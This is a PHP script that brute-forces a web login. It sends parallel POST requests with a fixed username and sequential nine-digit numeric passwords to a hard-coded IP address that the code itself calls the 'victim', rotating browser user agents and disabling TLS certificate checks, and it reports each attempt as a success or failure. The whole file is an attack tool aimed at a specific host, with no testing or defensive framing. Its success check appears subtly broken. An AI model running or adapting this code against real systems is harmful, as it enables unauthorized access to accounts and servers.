<?php

class ParallelGet
{
    function __construct($urls,$listPass)
    {
      

        // Create get requests for each URL
        $mh = curl_multi_init();

        foreach($urls as $i => $url)
        {
            $posting = "username=mukhlish&password=".$listPass[$i]."&submit=login";
            $post = array($posting,$posting,$posting,$posting);
            $useragent = array("Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
                                "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0",
                                "Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0",
                                "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
                                );

            $ch[$i] = curl_init($url);
            curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch[$i], CURLOPT_NOBODY, 1);
            curl_setopt($ch[$i], CURLOPT_POSTFIELDS, $post[$i]);
            curl_setopt($ch[$i],CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch[$i],CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch[$i],CURLOPT_USERAGENT, $useragent[$i]);
            curl_multi_add_handle($mh, $ch[$i]);
        }


        $runningHandles = null;
        // Start performing the request
        do {
           print $execReturnValue = curl_multi_exec($mh, $runningHandles);
        } while ($execReturnValue == CURLM_CALL_MULTI_PERFORM);

        // Loop and continue processing the request
        while ($runningHandles && $execReturnValue == CURLM_OK) 
        {
            // !!!!! changed this if and the next do-while !!!!!

            if (curl_multi_select($mh) != -1) 
            {
                usleep(300);
            }

            do {
              print  $execReturnValue = curl_multi_exec($mh, $runningHandles);
            } while ($execReturnValue == CURLM_CALL_MULTI_PERFORM);
        }

        // Check for any errors
        if ($execReturnValue != CURLM_OK) 
        {
            trigger_error("Curl multi read error $execReturnValue\n", E_USER_WARNING);
        }

        // Extract the content
        foreach ($urls as $i => $url)
        {
            // Check for errors
            $curlError = curl_error($ch[$i]);

            if ($curlError == "") 
            {
               print $responseContent = curl_multi_getcontent($ch[$i]);
                $res[$i] = $responseContent;
            } 
            else 
            {
                print "Curl error on handle $i: $curlError\n";
            }
            // Remove and close the handle
            curl_multi_remove_handle($mh, $ch[$i]);
            curl_close($ch[$i]);
        }

        // Clean up the curl_multi handle
        curl_multi_close($mh);

        // Print the response data
        //print "response data: " . print_r($res, true);

        $akhir = microtime(true);
        $lama = substr(($akhir - $_SERVER["REQUEST_TIME_FLOAT"]),0,4);

        foreach ($res as $key => $value)
        {
            if(preg_match("#HTTP/1.1 302#", $key))
            {   
                print "{$value} Berhasil ".$listPass[$key]." {$lama}s \r\n";
            }else
            {
                print "{$value} GAGAL ".$listPass[$key]." {$lama}s \r\n";
            }
        }

    }
}

$vic = 'http://178.128.69.182/cre.php';

$victims = array($vic,$vic,$vic,$vic);


//==========================================
    $much = 999999999;

    for ($i=1; $i < $much; $i++) { 

        $password1 = str_pad($i, 9, '0', STR_PAD_LEFT);
        
        $password2 = str_pad(++$i, 9, '0', STR_PAD_LEFT);
  

        $password3 = str_pad(++$i, 9, '0', STR_PAD_LEFT);
        
        $password4 = str_pad(++$i, 9, '0', STR_PAD_LEFT);

        $listPass = array($password1,$password2,$password3,$password4);

        $getter = new ParallelGet($victims,$listPass);
    }
